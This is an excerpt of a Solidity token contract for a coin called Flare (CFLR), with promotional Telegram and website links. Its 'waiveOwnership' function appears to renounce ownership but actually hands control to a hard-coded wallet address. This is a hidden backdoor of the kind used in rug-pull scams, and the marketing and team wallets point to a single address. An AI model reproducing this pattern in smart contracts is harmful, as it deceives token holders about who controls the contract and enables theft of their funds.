...
/**
Telegram : https://t.me/flarechainofficial
Website  : https://flarechain.online/
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xBa9e4E5c30F2CF109F3247c82A04d040A6089a96);
    }
...
contract Flare is Context, IERC20, Ownable {
    ...
    string private _symbol = "CFLR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2aC35C21bC02d078017A6BFf17915c6134884bA8);
    address payable public teamWalletAddress = payable(0x2aC35C21bC02d078017A6BFf17915c6134884bA8);
